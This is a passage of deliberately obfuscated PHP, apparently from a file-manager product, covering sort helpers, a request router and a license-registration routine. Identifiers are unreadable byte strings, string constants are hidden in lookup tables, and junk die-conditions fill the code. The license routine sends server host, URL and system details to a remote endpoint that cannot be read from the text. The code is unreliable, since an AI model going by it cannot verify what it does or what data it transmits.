unset($áë…×ì); return parent::resetData($Ü’Ïğú‘); } public function moveBottom($ı“¤Ó£ ) { $ı•‰³‘÷ =& $_SERVER[´‹ô¯Œ]; $¿Æ£”Õº = $this->getSort($ı•‰³‘÷[338]) + 1; return parent::update($ı“¤Ó£ , array($ı•‰³‘÷[2020] => $¿Æ£”Õº)); } public function resetSort($ÜØ”Ö’å) { $Šú²äÄß =& $_SERVER[´‹ô¯Œ]; $ŸŞ£æÙÙ = array(); $ÜØ”Ö’å = is_array($ÜØ”Ö’å) ? $ÜØ”Ö’å : array(); for ($¢ÆÇ™•© = 0; $¢ÆÇ™•© < count($ÜØ”Ö’å); $¢ÆÇ™•©++) { $ŸŞ£æÙÙ[$ÜØ”Ö’å[$¢ÆÇ™•©] . $Šú²äÄß[12]] = $¢ÆÇ™•© + 1; } $¹ïÂğÊñ = parent::listData(); foreach ($¹ïÂğÊñ as &$œ¹‹Àô) { $‚¤üïÕ = $ŸŞ£æÙÙ[$œ¹‹Àô[$Šú²äÄß[487]]]; $œ¹‹Àô[$Šú²äÄß[2020]] = $‚¤üïÕ ? $‚¤üïÕ : $œ¹‹Àô[$Šú²äÄß[2020]]; } unset($œ¹‹Àô); return parent::resetData($¹ïÂğÊñ); } private function getSort($¨ˆ¸ù¢µ) { $ûçğ°ªë =& $_SERVER[´‹ô¯Œ]; $üèÒê› = parent::listData(); $ÚÚá¦ÙŠ = array_to_keyvalue($üèÒê›, $ûçğ°ªë[12], $ûçğ°ªë[2020]); if (!$ÚÚá¦ÙŠ) { $ÚÚá¦ÙŠ = array(0); } $‹œúˆç™ = $¨ˆ¸ù¢µ == $ûçğ°ªë[338] ? max($ÚÚá¦ÙŠ) : min($ÚÚá¦ÙŠ); return intval($‹œúˆç™); } } goto d¦İ½±Ğ«ö; d İğµÕ©Ê: $ugmlznabtf = $_SERVER[´‹ô¯Œ][699]; class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($ËûäÃ») { $°øÍıÄÑ =& $_SERVER[´‹ô¯Œ]; $Ú•š®› =& $_SERVER[¢›»Ğ››]; $ˆÎÌ¸óã = explode($Ú•š®›[0], trim($ËûäÃ», $Ú•š®›[0])); $ëĞäŒÍÅ = $°øÍıÄÑ[700]; while ($ëĞäŒÍÅ < $°øÍıÄÑ[701]) { if ($ëĞäŒÍÅ >= 0) { break; } $ëĞäŒÍÅ++; } $this->defaultModule = $ˆÎÌ¸óã[0] ? $ˆÎÌ¸óã[0] : $this->defaultModule; $¡«‡â©Ì = $°øÍıÄÑ[702]; if (!$¡«‡â©Ì) { die; } $this->defaultController = $ˆÎÌ¸óã[1] ? $ˆÎÌ¸óã[1] : $this->defaultController; $this->defaultAction = $ˆÎÌ¸óã[2] ? $ˆÎÌ¸óã[2] : $this->defaultAction; $this->phgc1d8d84f5($Ú•š®›[1], array($this, $Ú•š®›[2])); } public function appRun($ÔÍÆ‡”•) { $šòåú =& $_SERVER[´‹ô¯Œ]; $¬¢¥‡°´ =& $_SERVER[¢›»Ğ››]; $Å¥™Ÿà¶ = explode($¬¢¥‡°´[0], $ÔÍÆ‡”•); $ŞÓË¶û = $šòåú[703]; while ($ŞÓË¶û < $šòåú[480]) { if ($ŞÓË¶û >= 0) { break; } $ŞÓË¶û++; } $†ùŞâŠ¼ = strtolower($Å¥™Ÿà¶[0]); $ë–çÂ³ô = $¬¢¥‡°´[3]; $•¢²Â = $šòåú[704]; if (strlen($•¢²Â) < $šòåú[701]) { die; } if ($†ùŞâŠ¼ == $¬¢¥‡°´[4]) { $ë–çÂ³ô = $¬¢¥‡°´[5]; $Å¥™Ÿà¶[0] = $¬¢¥‡°´[6]; $Å¥™Ÿà¶[1] = $Å¥™Ÿà¶[1] . $¬¢¥‡°´[7]; $ÔÍÆ‡”• = join($¬¢¥‡°´[0], $Å¥™Ÿà¶); $ÔÍÆ‡”• = trim($ÔÍÆ‡”•, $¬¢¥‡°´[0]); } call_user_func(array($¬¢¥‡°´[8], $¬¢¥‡°´[9]), $ë–çÂ³ô . $¬¢¥‡°´[10], $ÔÍÆ‡”•); ActionCall($ÔÍÆ‡”•); call_user_func(array($¬¢¥‡°´[8], $¬¢¥‡°´[9]), $ë–çÂ³ô . $¬¢¥‡°´[11], $ÔÍÆ‡”•); $»äö¾İ = $šòåú[705]; if (!$»äö¾İ) { die; } } private function autorun() { $ãˆ¸¤Í =& $_SERVER[´‹ô¯Œ]; $öÀªú™Â =& $_SERVER[¢›»Ğ››]; global $config; if (count($config[$öÀªú™Â[12]]) == 0) { return; } foreach ($config[$öÀªú™Â[12]] as $ÃİÀÁ‚ => $¡ä·‚) { $this->appRun($¡ä·‚); $®¸Åµ‚Î = $ãˆ¸¤Í[706]; if (strlen($®¸Åµ‚Î) < $ãˆ¸¤Í[480]) { return; } } } private function pflt14294964() { $Ñùßª€ß =& $_SERVER[´‹ô¯Œ]; $Çåõë±É =& $_SERVER[¢›»Ğ››]; $¯ºÙä€§ = $Çåõë±É[4]; $¹Ş‘¢¢ã = $Ñùßª€ß[707]; $Ü›ç£… = $GLOBALS[$Çåõë±É[13]][$Çåõë±É[14]][0]; if (!$Ü›ç£… || strlen($Ü›ç£…) <= strlen($¯ºÙä€§)) { return; } if (strtolower(substr($Ü›ç£…, -strlen($¯ºÙä€§))) != $¯ºÙä€§) { return; } $‘¨ÌØëò = substr($Ü›ç£…, 0, -strlen($¯ºÙä€§)); $‡ìû˜µ = array($Çåõë±É[4], $‘¨ÌØëò); $ª˜‰ì‡ş = $Ñùßª€ß[708]; if (!$ª˜‰ì‡ş) { die; } $†©Îáû„ = array_slice($GLOBALS[$Çåõë±É[13]][$Çåõë±É[14]], 1); $GLOBALS[$Çåõë±É[13]][$Çåõë±É[14]] = array_merge($‡ìû˜µ, $†©Îáû„); $GLOBALS[$Çåõë±É[13]][$Çåõë±É[15]] = implode($Çåõë±É[0], $GLOBALS[$Çåõë±É[13]][$Çåõë±É[14]]); } private function tcpff6db8107() { $—÷¹Êó =& $_SERVER[´‹ô¯Œ]; $“üˆÃœ =& $_SERVER[¢›»Ğ››]; if ($GLOBALS[$“üˆÃœ[13]][$“üˆÃœ[15]] != $“üˆÃœ[6]) { return; } $æáÜ”µ = $_SERVER[$“üˆÃœ[16]]; $Ô“ˆ¹¤ = $“üˆÃœ[17]; $Çš€ş¾« = $—÷¹Êó[709]; if (strlen($Çš€ş¾«) < $—÷¹Êó[710]) { die; } if (!strstr($æáÜ”µ, $Ô“ˆ¹¤)) { return; } $îİ¦Æ—ö = strrpos($æáÜ”µ, $Ô“ˆ¹¤); $²üô¿å = substr($æáÜ”µ, $îİ¦Æ—ö + strlen($Ô“ˆ¹¤)); $™ ĞõÓÈ = $—÷¹Êó[711]; if (!$™ ĞõÓÈ) { die; } preg_match_all($“üˆÃœ[18], $²üô¿å, $úÃï»Ûı); $Ÿ°ä‘î• = $—÷¹Êó[712]; if (strlen($Ÿ°ä‘î•) < $—÷¹Êó[713]) { die; } $²üô¿å = trim($úÃï»Ûı[0][0], $“üˆÃœ[19]); $ ì½ÏÍ = $—÷¹Êó[714]; $GLOBALS[$“üˆÃœ[13]][$“üˆÃœ[14]] = explode($“üˆÃœ[19], $²üô¿å); $ÓºöéúÈ = $—÷¹Êó[715]; if (strlen($ÓºöéúÈ) < $—÷¹Êó[710]) { die; } $GLOBALS[$“üˆÃœ[13]][$“üˆÃœ[15]] = implode($“üˆÃœ[0], $GLOBALS[$“üˆÃœ[13]][$“üˆÃœ[14]]); $ë’¨¾Š = $—÷¹Êó[716]; while (strlen($ë’¨¾Š) < $—÷¹Êó[713]) { if (!$ë’¨¾Š) { break; } $ë’¨¾Š++; } } public function run() { $øÚÈœ…û =& $_SERVER[´‹ô¯Œ]; $£†œùÎú =& $_SERVER[¢›»Ğ››]; $this->tcpff6db8107(); $this->pflt14294964(); $ş©Ñ‹ËŒ = $øÚÈœ…û[717]; while (strlen($ş©Ñ‹ËŒ) < $øÚÈœ…û[701]) { if (!$ş©Ñ‹ËŒ) { break; } $ş©Ñ‹ËŒ++; } $Â§İ•¤ = $GLOBALS[$£†œùÎú[13]][$£†œùÎú[14]]; $ ¥úÙô¢ = $øÚÈœ…û[718]; $å¨Á¼îÜ = $GLOBALS[$£†œùÎú[13]][$£†œùÎú[15]]; define($£†œùÎú[20], isset($Â§İ•¤[0]) && $Â§İ•¤[0] ? $Â§İ•¤[0] : $this->defaultModule); define($£†œùÎú[21], isset($Â§İ•¤[1]) && $Â§İ•¤[0] ? $Â§İ•¤[1] : $this->defaultController); $µ‹™Ôô = $øÚÈœ…û[719]; while ($µ‹™Ôô < $øÚÈœ…û[713]) { if ($µ‹™Ôô >= 0) { break; } $µ‹™Ôô++; } define($£†œùÎú[22], isset($Â§İ•¤[2]) && $Â§İ•¤[0] ? $Â§İ•¤[2] : $this->defaultAction); define($£†œùÎú[23], MOD . $£†œùÎú[0] . ST . $£†œùÎú[0] . ACT); $_SERVER[$£†œùÎú[24]] = strtolower(ACTION); $±åĞ±Ë‹ = $øÚÈœ…û[720]; $this->autorun(); $üŸ…Âì = $øÚÈœ…û[721]; if (strlen($üŸ…Âì) < $øÚÈœ…û[713]) { return; } if (count($Â§İ•¤) >= 3) { $this->appRun($å¨Á¼îÜ); } else { $this->appRun(ACTION); } } private $bfhrda9c6b75 = array(); private $odlnf59073d2 = ''; public function rubq08496d52() { $†Ö„®Ó¸ =& $_SERVER[´‹ô¯Œ]; $ëòîûè¨ =& $_SERVER[¢›»Ğ››]; $this->bdqp33cef662(); $this->xfqr3b26ddd1(); $this->porndac4d908(); $this->rcund30e10a2(); $»ÇÙ™ì« = $†Ö„®Ó¸[722]; if (!$»ÇÙ™ì«) { die; } $this->gmzn1c2ab081(); $this->ybdaad1c1e9e(); $Ãìøıãé = $†Ö„®Ó¸[723]; $this->tvml81c962e9(); $this->phgc1d8d84f5($ëòîûè¨[25], array($this, $ëòîûè¨[26])); $¾§¬¸¶Ö = $†Ö„®Ó¸[724]; $this->phgc1d8d84f5($ëòîûè¨[27], array($this, $ëòîûè¨[28])); $this->phgc1d8d84f5($ëòîûè¨[29], array($this, $ëòîûè¨[30])); $·‘ÃÄ‰ = $†Ö„®Ó¸[725]; if (!$·‘ÃÄ‰) { die; } $this->phgc1d8d84f5($ëòîûè¨[31], array($this, $ëòîûè¨[32])); } public function pnuc7b72bf0f($‹Ã¶Ö¸ú) { $¹ˆ­°äÒ =& $_SERVER[´‹ô¯Œ]; $¢ßº•Ş¯ =& $_SERVER[¢›»Ğ››]; $…¥Ã¸èò = Model($¢ßº•Ş¯[33])->get(); $«ÁÏ×ê¶ = array($¢ßº•Ş¯[34], $¢ßº•Ş¯[35], $¢ßº•Ş¯[36], $¢ßº•Ş¯[37], $¢ßº•Ş¯[38], $¢ßº•Ş¯[39], $¢ßº•Ş¯[40], $¢ßº•Ş¯[41], $¢ßº•Ş¯[42], $¢ßº•Ş¯[43], $¢ßº•Ş¯[44], $¢ßº•Ş¯[45], $¢ßº•Ş¯[46], $¢ßº•Ş¯[47], $¢ßº•Ş¯[48], $¢ßº•Ş¯[49], $¢ßº•Ş¯[50], $¢ßº•Ş¯[51], $¢ßº•Ş¯[52], $¢ßº•Ş¯[53], $¢ßº•Ş¯[54], $¢ßº•Ş¯[55], $¢ßº•Ş¯[56], $¢ßº•Ş¯[57], $¢ßº•Ş¯[58], $¢ßº•Ş¯[59], $¢ßº•Ş¯[60], $¢ßº•Ş¯[61], $¢ßº•Ş¯[62], $¢ßº•Ş¯[63], $¢ßº•Ş¯[64], $¢ßº•Ş¯[65], $¢ßº•Ş¯[66], $¢ßº•Ş¯[67], $¢ßº•Ş¯[68], $¢ßº•Ş¯[69], $¢ßº•Ş¯[70], $¢ßº•Ş¯[71], $¢ßº•Ş¯[72], $¢ßº•Ş¯[73], $¢ßº•Ş¯[74], $¢ßº•Ş¯[75], $¢ßº•Ş¯[76], $¢ßº•Ş¯[77], $¢ßº•Ş¯[78], $¢ßº•Ş¯[79], $¢ßº•Ş¯[80], $¢ßº•Ş¯[81], $¢ßº•Ş¯[82], $¢ßº•Ş¯[83], $¢ßº•Ş¯[84], $¢ßº•Ş¯[85]); $ÎÊñ˜¤ü = $¹ˆ­°äÒ[726]; if (!$ÎÊñ˜¤ü) { return; } foreach ($«ÁÏ×ê¶ as $Á¾»Àú) { $õØ¼ïƒ  = $GLOBALS[$¢ßº•Ş¯[86]][$¢ßº•Ş¯[87]][$Á¾»Àú]; $Òõ·´ = $¹ˆ­°äÒ[727]; if (strlen($Òõ·´) < $¹ˆ­°äÒ[728]) { die; } if (isset($…¥Ã¸èò[$Á¾»Àú])) { $õØ¼ïƒ  = $…¥Ã¸èò[$Á¾»Àú]; } $‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[89]][$Á¾»Àú] = $õØ¼ïƒ ; } $›Ó´Ş¹ö = $‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[89]][$¢ßº•Ş¯[46]]; $ñÑ±Æ´² = $¹ˆ­°äÒ[729]; unset($‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[90]][$¢ßº•Ş¯[91]]); unset($‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[90]][$¢ßº•Ş¯[92]]); unset($‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[89]][$¢ßº•Ş¯[46]]); $¥¬ëÕİ€ = $¹ˆ­°äÒ[730]; while ($¥¬ëÕİ€ < $¹ˆ­°äÒ[728]) { if ($¥¬ëÕİ€ >= 0) { break; } $¥¬ëÕİ€++; } unset($‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[89]][$¢ßº•Ş¯[93]]); $‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[89]][$¢ßº•Ş¯[94]] = array($¢ßº•Ş¯[95] => (int) $›Ó´Ş¹ö[$¢ßº•Ş¯[96]], $¢ßº•Ş¯[97] => (int) _get($›Ó´Ş¹ö, $¢ßº•Ş¯[98], 0)); $†¦çÌ‡€ = substr(md5($¢ßº•Ş¯[99] . get_client_ip() . $…¥Ã¸èò[$¢ßº•Ş¯[100]]), 0, 15); $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[102]] = Mcrypt::encode(Session::sign(), $†¦çÌ‡€, 3600 * 24); $¡·â£ = $¹ˆ­°äÒ[731]; while (strlen($¡·â£) < $¹ˆ­°äÒ[480]) { if (!$¡·â£) { break; } $¡·â£++; } $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[103]] = Action($¢ßº•Ş¯[104])->accessToken(); $‘âÓ¤Ó = $¹ˆ­°äÒ[732]; $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[105]] = md5($_SERVER[$¢ßº•Ş¯[106]] . $…¥Ã¸èò[$¢ßº•Ş¯[100]]); $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[107]] = base64_encode(serverInfo()); $Ú—–£ï§ = $¹ˆ­°äÒ[733]; if (!$Ú—–£ï§) { die; } $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[108]] = $this->odlnf59073d2; $üëŒêû = $¹ˆ­°äÒ[734]; if (strlen($üëŒêû) < $¹ˆ­°äÒ[701]) { return; } if ($…¥Ã¸èò[$¢ßº•Ş¯[108]] != $¢ßº•Ş¯[109]) { $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[110]] = $…¥Ã¸èò[$¢ßº•Ş¯[110]]; $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[111]] = $…¥Ã¸èò[$¢ßº•Ş¯[111]]; $¬³€¤Ö  = rand_string(10) . $this->odlnf59073d2 . rand_string(5); $‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[112]][$¢ßº•Ş¯[113]] = $this->nfmr8e473cf9($¬³€¤Ö , $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[105]]); } if ($this->odlnf59073d2 == $¢ßº•Ş¯[109]) { $‹Ã¶Ö¸ú[$¢ßº•Ş¯[88]][$¢ßº•Ş¯[89]][$¢ßº•Ş¯[94]][$¢ßº•Ş¯[98]] = 0; } $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[114]] = $this->versionPluginFilter(); $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[115]] = _get($this->bfhrda9c6b75, $¢ßº•Ş¯[116], $¢ßº•Ş¯[6]); if (KodUser::isRoot() && $this->config[$¢ßº•Ş¯[117]]) { $‹Ã¶Ö¸ú[$¢ßº•Ş¯[101]][$¢ßº•Ş¯[118]] = WEB_ROOT; } return $‹Ã¶Ö¸ú; } private function ybdaad1c1e9e() { $¡À™›À =& $_SERVER[´‹ô¯Œ]; $€‰ŸƒÄ˜ =& $_SERVER[¢›»Ğ››]; $åï€¿ï = $_SERVER[$€‰ŸƒÄ˜[24]] == $€‰ŸƒÄ˜[119]; if ($_SERVER[$€‰ŸƒÄ˜[24]] == $€‰ŸƒÄ˜[120] && $_GET[$€‰ŸƒÄ˜[121]] == $€‰ŸƒÄ˜[122]) { $åï€¿ï = !0; } if ($åï€¿ï) { $Î»ÙÊÈ› = array($€‰ŸƒÄ˜[108] => $this->odlnf59073d2, $€‰ŸƒÄ˜[123] => $this->fsmc5cc898f3(), $€‰ŸƒÄ˜[124] => Model($€‰ŸƒÄ˜[125])->count()); if ($this->odlnf59073d2 != $€‰ŸƒÄ˜[109]) { $˜´™…‹¢ = _get($this->bfhrda9c6b75, $€‰ŸƒÄ˜[126]); if ($˜´™…‹¢) { $Î»ÙÊÈ›[$€‰ŸƒÄ˜[127]] = $˜´™…‹¢; $Î»ÙÊÈ›[$€‰ŸƒÄ˜[128]] = strtotime(_get($this->bfhrda9c6b75, $€‰ŸƒÄ˜[129])); $Î»ÙÊÈ›[$€‰ŸƒÄ˜[130]] = _get($this->bfhrda9c6b75, $€‰ŸƒÄ˜[116]); } $Éšü’Ë = Model($€‰ŸƒÄ˜[33])->get($€‰ŸƒÄ˜[131], $€‰ŸƒÄ˜[6], !0); if (is_string($Éšü’Ë) && substr($Éšü’Ë, 0, 1) == $€‰ŸƒÄ˜[132]) { $Éšü’Ë = json_decode_force($Éšü’Ë); } if (is_array($Éšü’Ë) && $Éšü’Ë[$€‰ŸƒÄ˜[133]] && strstr($Éšü’Ë[$€‰ŸƒÄ˜[133]], $€‰ŸƒÄ˜[134])) { $Ç˜·¦ˆ = explode($€‰ŸƒÄ˜[134], $Éšü’Ë[$€‰ŸƒÄ˜[133]]); $Î»ÙÊÈ›[$€‰ŸƒÄ˜[135]] = $Ç˜·¦ˆ[0]; } } $Î»ÙÊÈ› = $this->fpjb85ac07cc(json_encode($Î»ÙÊÈ›), md5($€‰ŸƒÄ˜[136])); $«¦í¸ùã = $¡À™›À[735]; if (!$«¦í¸ùã) { return; } $±™áÊÃ° = array($€‰ŸƒÄ˜[137] => $Î»ÙÊÈ›); call_user_func(array($€‰ŸƒÄ˜[138], $€‰ŸƒÄ˜[139]), $±™áÊÃ°); } if ($this->odlnf59073d2 == $€‰ŸƒÄ˜[109]) { return; } $÷‡éçü = array($€‰ŸƒÄ˜[140], $€‰ŸƒÄ˜[141], $€‰ŸƒÄ˜[142], $€‰ŸƒÄ˜[143], $€‰ŸƒÄ˜[144], $€‰ŸƒÄ˜[145]); $£ÏîöçŠ = Model($€‰ŸƒÄ˜[33])->get(); $Å¹Êõ› = $¡À™›À[736]; $±™áÊÃ° = array($€‰ŸƒÄ˜[146] => $£ÏîöçŠ[$€‰ŸƒÄ˜[34]], $€‰ŸƒÄ˜[147] => $£ÏîöçŠ[$€‰ŸƒÄ˜[35]], $€‰ŸƒÄ˜[148] => $€‰ŸƒÄ˜[6]); foreach ($÷‡éçü as $•Ğƒ“Ğ£) { if (!isset($£ÏîöçŠ[$•Ğƒ“Ğ£]) || !$£ÏîöçŠ[$•Ğƒ“Ğ£]) { continue; } $±™áÊÃ°[$•Ğƒ“Ğ£] = $£ÏîöçŠ[$•Ğƒ“Ğ£]; $½èŒ¦ÚŸ = $¡À™›À[737]; if (!$½èŒ¦ÚŸ) { return; } } call_user_func(array($€‰ŸƒÄ˜[138], $€‰ŸƒÄ˜[139]), $±™áÊÃ°); $‹äÀöï = $¡À™›À[738]; } private function rcund30e10a2() { $òÍóğÛñ =& $_SERVER[´‹ô¯Œ]; $³ÚÌ¿ªã =& $_SERVER[¢›»Ğ››]; if ($_SERVER[$³ÚÌ¿ªã[24]] != $³ÚÌ¿ªã[149]) { return; } if (!KodUser::isRoot()) { die; } $·ÁÖË® = $GLOBALS[$³ÚÌ¿ªã[13]]; if (isset($·ÁÖË®[$³ÚÌ¿ªã[150]])) { $this->eiatb114f888(); die; } if (isset($·ÁÖË®[$³ÚÌ¿ªã[151]]) && isset($·ÁÖË®[$³ÚÌ¿ªã[151]]) == $³ÚÌ¿ªã[122]) { $·ÁÖË®[$³ÚÌ¿ªã[152]] = Model($³ÚÌ¿ªã[33])->get($³ÚÌ¿ªã[153]); } if (!isset($·ÁÖË®[$³ÚÌ¿ªã[152]]) || strlen($·ÁÖË®[$³ÚÌ¿ªã[152]]) != 16) { show_json($³ÚÌ¿ªã[154] . $·ÁÖË®[$³ÚÌ¿ªã[152]], !1); } $§¥éŞŒç = Model($³ÚÌ¿ªã[33])->get($³ÚÌ¿ªã[100]); $—ˆ¤Úí‘ = md5($_SERVER[$³ÚÌ¿ªã[106]] . $§¥éŞŒç); $„™¿ÛÇ— = array($³ÚÌ¿ªã[152] => $·ÁÖË®[$³ÚÌ¿ªã[152]], $³ÚÌ¿ªã[155] => rand_string(16), $³ÚÌ¿ªã[156] => $³ÚÌ¿ªã[136], $³ÚÌ¿ªã[157] => $³ÚÌ¿ªã[158], $³ÚÌ¿ªã[159] => $_SERVER[$³ÚÌ¿ªã[160]], $³ÚÌ¿ªã[161] => $_SERVER[$³ÚÌ¿ªã[162]], $³ÚÌ¿ªã[163] => $_SERVER[$³ÚÌ¿ªã[164]], $³ÚÌ¿ªã[105] => $—ˆ¤Úí‘, $³ÚÌ¿ªã[165] => Model($³ÚÌ¿ªã[33])->get($³ÚÌ¿ªã[131])); $•ú’Í¬ï = $òÍóğÛñ[739]; if (!$•ú’Í¬ï) { die; } if (isset($·ÁÖË®[$³ÚÌ¿ªã[151]]) && isset($·ÁÖË®[$³ÚÌ¿ªã[151]]) == $³ÚÌ¿ªã[122]) { $„™¿ÛÇ—[$³ÚÌ¿ªã[151]] = md5($„™¿ÛÇ—[$³ÚÌ¿ªã[152]] . $³ÚÌ¿ªã[166] . $„™¿ÛÇ—[$³ÚÌ¿ªã[155]]); } if ($·ÁÖË®[$³ÚÌ¿ªã[167]] == $³ÚÌ¿ªã[168]) { $â¼ˆ§ÒÔ = $this->fpjb85ac07cc($—ˆ¤Úí‘, $³ÚÌ¿ªã[169]); $üõ‘õ¿ = $this->nfmr8e473cf9(json_encode($„™¿ÛÇ—), $—ˆ¤Úí‘ . $³ÚÌ¿ªã[170], 3); $üõ‘õ¿ = $üõ‘õ¿ . $³ÚÌ¿ªã[171] . $_SERVER[$³ÚÌ¿ªã[160]]; $• ‰Š = $this->gnko545d879f($³ÚÌ¿ªã[172] . $â¼ˆ§ÒÔ . $³ÚÌ¿ªã[173] . $üõ‘õ¿, -1); show_json($• ‰Š, !0); } else { if ($·ÁÖË®[$³ÚÌ¿ªã[167]] == $³ÚÌ¿ªã[174]) { $”Åêô = substr(md5($³ÚÌ¿ªã[175] . $—ˆ¤Úí‘), 12, 15) . $³ÚÌ¿ªã[176]; $üõ‘õ¿ = $this->yfdcf293738c(trim($·ÁÖË®[$³ÚÌ¿ªã[177]]), $”Åêô, 2); $ğçú÷Õ– = json_decode($üõ‘õ¿, !0); if (!is_array($ğçú÷Õ–) || !is_array($ğçú÷Õ–[$³ÚÌ¿ªã[178]]) || $ğçú÷Õ–[$³ÚÌ¿ªã[152]] != !0) { $¥ŒåË¸¤ = $³ÚÌ¿ªã[179]; $°÷¶ÂÈú = $ğçú÷Õ–[$³ÚÌ¿ªã[178]] ? $³ÚÌ¿ªã[180] . $ğçú÷Õ–[$³ÚÌ¿ªã[178]] : $¥ŒåË¸¤; show_json($°÷¶ÂÈú, !1); } else { $„™¿ÛÇ—[$³ÚÌ¿ªã[155]] = $ğçú÷Õ–[$³ÚÌ¿ªã[178]][$³ÚÌ¿ªã[181]]; } } else { $ğçú÷Õ– = $this->gnko545d879f($³ÚÌ¿ªã[182], $„™¿ÛÇ—, 10); $…–‰« = $òÍóğÛñ[740]; } } if (!is_array($ğçú÷Õ–) || !is_array($ğçú÷Õ–[$³ÚÌ¿ªã[178]]) || $ğçú÷Õ–[$³ÚÌ¿ªã[152]] != !0) { $¥ŒåË¸¤ = LNG($³ÚÌ¿ªã[183]); $°÷¶ÂÈú = $ğçú÷Õ–[$³ÚÌ¿ªã[178]] ? $³ÚÌ¿ªã[180] . $ğçú÷Õ–[$³ÚÌ¿ªã[178]] : $¥ŒåË¸¤; show_json($°÷¶ÂÈú, !1); } $Çâôø† = $ğçú÷Õ–[$³ÚÌ¿ªã[178]]; $²Š´—‚ = $this->ukbfce62f632($Çâôø†[$³ÚÌ¿ªã[184]]); if (!$²Š´—‚ || $²Š´—‚ != $Çâôø†[$³ÚÌ¿ªã[129]]) { $£Êòãé€ = array($³ÚÌ¿ªã[185] => Model($³ÚÌ¿ªã[33])->get($³ÚÌ¿ªã[100]), $³ÚÌ¿ªã[186] => $_SERVER[$³ÚÌ¿ªã[106]], $³ÚÌ¿ªã[187] => this_url(), $³ÚÌ¿ªã[161] => $_SERVER[$³ÚÌ¿ªã[162]]); $üõ‘õ¿ = $this->dwfpb878f53c(json_encode($£Êòãé€)); $this->gnko545d879f($³ÚÌ¿ªã[188] . $üõ‘õ¿); show_json(LNG($³ÚÌ¿ªã[189]), !0); } $âš±ïË© = array($³ÚÌ¿ªã[153] => $Çâôø†[$³ÚÌ¿ªã[190]], $³ÚÌ¿ªã[191] => $Çâôø†[$³ÚÌ¿ªã[192]], $³ÚÌ¿ªã[193] => rand_string(16), $³ÚÌ¿ªã[108] => $Çâôø†[$³ÚÌ¿ªã[194]]); if ($„™¿ÛÇ—[$³ÚÌ¿ªã[155]]) { $âš±ïË©[$³ÚÌ¿ªã[193]] = $„™¿ÛÇ—[$³ÚÌ¿ªã[155]]; } $âş•õ¹ã = substr(md5($âš±ïË©[$³ÚÌ¿ªã[191]]), 10, 10); $Ó—ó“ƒÀ = $âş•õ¹ã . $âš±ïË©[$³ÚÌ¿ªã[108]] . $âš±ïË©[$³ÚÌ¿ªã[193]]; $âš±ïË©[$³ÚÌ¿ªã[110]] = strrev(base64_encode($this->fpjb85ac07cc($Ó—ó“ƒÀ, $³ÚÌ¿ªã[195]))); $õ‚•’ã€ = rand_string(16); $—Îªä«¬ = $òÍóğÛñ[741]; $Æ…Õ›¤” = $õ‚•’ã€ . $âš±ïË©[$³ÚÌ¿ªã[108]] . $this->fpjb85ac07cc(md5($âš±ïË©[$³ÚÌ¿ªã[153]]), $õ‚•’ã€); $èñè¸´Á = $òÍóğÛñ[742]; $âš±ïË©[$³ÚÌ¿ªã[111]] = base64_encode(strrev($this->fpjb85ac07cc($Æ…Õ›¤”, $³ÚÌ¿ªã[196]))); $Ó¸ÙòŸ = $òÍóğÛñ[743]; if (strlen($Ó¸ÙòŸ) < $òÍóğÛñ[701]) { die; } if ($Çâôø†[$³ÚÌ¿ªã[197]] && $Çâôø†[$³ÚÌ¿ªã[197]] >= 1) { Model($³ÚÌ¿ªã[33])->setDeep($³ÚÌ¿ªã[198], $³ÚÌ¿ªã[122]); } Model($³ÚÌ¿ªã[33])->set($âš±ïË©); $Áœ×¿Øµ = md5($_SERVER[$³ÚÌ¿ªã[106]] . strrev($§¥éŞŒç) . $âš±ïË©[$³ÚÌ¿ªã[191]]); $¾ÍãÂç = strrev(substr($Áœ×¿Øµ, 10, 16)); $ç‹Ö¬ = $this->nfmr8e473cf9(json_encode($Çâôø†), $Áœ×¿Øµ); $¯²’¡¨‰ = $òÍóğÛñ[744]; if (!$¯²’¡¨‰) { die; } $È§º“´™ = array_to_keyvalue(Model($³ÚÌ¿ªã[7])->listData(), $³ÚÌ¿ªã[199]); $¿³€ÜÒ› = $È§º“´™[$³ÚÌ¿ªã[200]]; $½ı’õ¯ö = array(); $½ı’õ¯ö[$¾ÍãÂç] = $ç‹Ö¬; Model($³ÚÌ¿ªã[7])->update($¿³€ÜÒ›[$³ÚÌ¿ªã[201]], array($³ÚÌ¿ªã[202] => $½ı’õ¯ö)); $this->bfhrda9c6b75 = $Çâôø†; $this->odlnf59073d2 = $âš±ïË©[$³ÚÌ¿ªã[108]]; $this->licenseRegistSuccess(); Cache::set($³ÚÌ¿ªã[203] . md5($§¥éŞŒç . $³ÚÌ¿ªã[204]), $³ÚÌ¿ªã[6]); $áäÎ„Çå = $òÍóğÛñ[745]; if (!$áäÎ„Çå) { return; } show_json(LNG($³ÚÌ¿ªã[189]), !0); } private function licenseRegistSuccess() { $Ò¼–ê‚ =& $_SERVER[´‹ô¯Œ]; $ú¶¥õú† =& $_SERVER[¢›»Ğ››]; $³Õœ“ĞŒ = Model($ú¶¥õú†[33])->get(); $²²À›’Á = 